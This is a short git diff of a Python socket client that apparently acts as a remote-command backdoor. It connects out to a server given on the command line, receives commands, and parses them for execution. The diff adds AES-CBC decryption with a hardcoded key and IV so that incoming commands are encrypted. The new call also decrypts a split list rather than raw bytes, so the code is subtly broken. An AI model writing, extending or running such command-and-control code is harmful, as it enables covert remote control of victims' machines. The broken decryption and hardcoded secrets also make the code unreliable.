@@ -18,15 +18,19 @@ def do_encrypt(message):
     cipher = obj.encrypt(message)
     return cipher
 
+def do_decrypt(ciphertext):
+    obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
+    message = obj2.decrypt(ciphertext)
+    return message
+
 def main():
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
     s.connect((args.server, args.port))
-    output = 'NSTR'
     while True:
         try:
-            received = s.recv(buff).strip().split()
+            received = do_decrypt(s.recv(buff).strip().split())
             command = [ str(x, 'utf-8') for x in received ]
             if 'cmd' in command:
                 del command[0]
